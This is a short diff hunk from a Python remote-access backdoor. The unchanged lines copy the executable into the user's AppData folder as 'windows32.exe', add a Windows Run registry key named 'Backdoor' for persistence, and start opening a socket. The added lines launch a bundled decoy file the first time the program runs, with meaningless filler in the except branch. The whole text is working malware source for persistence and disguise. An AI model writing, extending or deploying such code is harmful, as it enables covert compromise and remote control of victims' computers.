@@ -116,6 +116,13 @@ location = os.environ["appdata"] + "\\windows32.exe"
 if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"'+ location +'"', shell=True)
+    file_name = sys.MEIPASS + "\icon.ico"#icon to show
+    try:
+        subprocess.Popen(file_name, shell=True)
+    except:
+        number = 1
+        number2 = 2
+        number3 = number + number2
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
